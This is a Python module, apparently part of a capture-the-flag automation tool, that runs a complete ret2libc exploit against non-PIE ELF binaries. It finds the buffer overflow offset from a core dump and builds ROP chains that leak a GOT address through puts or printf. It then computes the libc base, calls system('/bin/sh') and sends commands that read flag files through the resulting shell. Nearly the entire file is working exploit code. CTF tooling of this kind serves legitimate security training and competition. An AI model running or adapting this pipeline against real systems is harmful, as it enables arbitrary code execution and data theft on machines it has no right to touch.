"""
Automatic ret2libc exploitation.

This unit attempts a full ret2libc attack on vulnerable ELF binaries:
1. Finds buffer overflow offset via corefile
2. Leaks libc addresses using puts/printf from the PLT
3. Calculates libc base address
4. Calls system("/bin/sh") to get a shell

Ported from autorop's Classic turnkey pipeline.
"""

import os
import stat
from typing import Any

from flagr.unit import NotApplicable
from flagr.units.pwn import PwnUnit


class Unit(PwnUnit):

    GROUPS = ["pwn", "elf", "ret2libc", "exploit"]
    PRIORITY = 30
    RECURSE_SELF = False

    def __init__(self, *args, **kwargs):
        super(Unit, self).__init__(*args, **kwargs)

        try:
            from pwn import ELF
            self._elf = ELF(self.target.path, checksec=False)
        except Exception:
            raise NotApplicable("could not parse ELF")

        if self._elf.pie:
            raise NotApplicable("PIE binary")

        # Need puts or printf in PLT for leaking
        self._leak_func = None
        for func in ["puts", "printf"]:
            if func in self._elf.plt:
                self._leak_func = func
                break

        if not self._leak_func:
            raise NotApplicable("no leak function (puts/printf) in PLT")

        # Need a GOT entry to leak
        self._leak_symbols = []
        for sym in ["puts", "printf", "__libc_start_main", "read", "write"]:
            if sym in self._elf.got:
                self._leak_symbols.append(sym)

        if not self._leak_symbols:
            raise NotApplicable("no GOT entries to leak")

    def evaluate(self, case: Any):
        """
        Attempt ret2libc exploitation:
        1. Find offset via corefile
        2. Leak libc address via PLT
        3. Calculate libc base and call system("/bin/sh")
        """
        os.environ["PWNLIB_NOTERM"] = "1"
        from pwn import (
            process, cyclic, cyclic_find, context, ROP, ELF, Coredump,
            p64, p32, u64, u32
        )

        context.binary = self._elf
        context.log_level = "error"

        st = os.stat(self.target.path)
        os.chmod(self.target.path, st.st_mode | stat.S_IEXEC)

        pack = p64 if self._elf.bits == 64 else p32
        unpack = u64 if self._elf.bits == 64 else u32

        try:
            # Step 1: Find offset
            p = process(self.target.path)
            pattern = cyclic(1024, n=context.bytes)
            p.sendline(pattern)
            p.wait(timeout=5)

            core = Coredump(p.corefile.path)
            offset = cyclic_find(core.fault_addr, n=context.bytes)
            p.close()

            if not offset or offset <= 0 or offset >= 10000:
                return

            # Step 2: Leak libc address
            leak_sym = self._leak_symbols[0]

            rop = ROP(self._elf)

            if self._elf.bits == 64:
                # x86_64: need to set rdi = GOT entry, then call puts
                try:
                    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
                except (IndexError, TypeError):
                    return

                # Stack alignment
                try:
                    ret_gadget = rop.find_gadget(["ret"])[0]
                except (IndexError, TypeError):
                    ret_gadget = None

                payload = b"A" * offset
                if ret_gadget:
                    payload += pack(ret_gadget)
                payload += pack(pop_rdi)
                payload += pack(self._elf.got[leak_sym])
                payload += pack(self._elf.plt[self._leak_func])
                # Return to main/vulnerable function for second stage
                main_addr = self._elf.symbols.get("main", self._elf.symbols.get("_start", None))
                if main_addr:
                    payload += pack(main_addr)
            else:
                # x86: call puts(GOT[sym]) then return to main
                payload = b"A" * offset
                payload += pack(self._elf.plt[self._leak_func])
                main_addr = self._elf.symbols.get("main", self._elf.symbols.get("_start", None))
                if main_addr:
                    payload += pack(main_addr)
                else:
                    payload += b"BBBB"
                payload += pack(self._elf.got[leak_sym])

            p = process(self.target.path)
            p.sendline(payload)

            # Read leaked address
            try:
                # Skip any output before the leak
                p.recvuntil(b"\n", timeout=2)
                leaked_bytes = p.recvline(timeout=2).strip()

                if self._elf.bits == 64:
                    leaked_addr = unpack(leaked_bytes.ljust(8, b"\x00")[:8])
                else:
                    leaked_addr = unpack(leaked_bytes.ljust(4, b"\x00")[:4])

                if leaked_addr == 0 or leaked_addr > 0x7fffffffffff:
                    p.close()
                    return

                # Step 3: Find libc and calculate base
                libc = self._elf.libc
                if libc is None:
                    p.close()
                    result = (
                        f"ret2libc: Leaked {leak_sym} address: {hex(leaked_addr)}\n"
                        f"  Binary: {self.target.path}\n"
                        f"  Offset: {offset} bytes\n"
                        f"  Could not find libc automatically.\n"
                        f"  Use leaked address with libc-database to identify libc."
                    )
                    self.manager.register_data(self, result)
                    return

                libc_base = leaked_addr - libc.symbols[leak_sym]
                libc.address = libc_base

                # Step 4: Call system("/bin/sh")
                bin_sh = next(libc.search(b"/bin/sh\x00"))
                system = libc.symbols["system"]

                rop2 = ROP([self._elf, libc])

                if self._elf.bits == 64:
                    payload2 = b"A" * offset
                    try:
                        ret_gadget = rop2.find_gadget(["ret"])[0]
                        payload2 += pack(ret_gadget)
                    except (IndexError, TypeError):
                        pass
                    payload2 += pack(pop_rdi)
                    payload2 += pack(bin_sh)
                    payload2 += pack(system)
                else:
                    payload2 = b"A" * offset
                    payload2 += pack(system)
                    payload2 += b"BBBB"  # return addr (don't care)
                    payload2 += pack(bin_sh)

                p.sendline(payload2)

                # Try to interact and get flag
                try:
                    p.sendline(b"echo 'SHELL_OBTAINED'")
                    p.sendline(b"cat flag* 2>/dev/null; cat /flag* 2>/dev/null; ls -la")
                    output = p.recvall(timeout=3)
                    if output:
                        self.manager.register_data(self, output)
                except Exception:
                    pass

            except Exception:
                pass
            finally:
                p.close()

        except Exception:
            pass
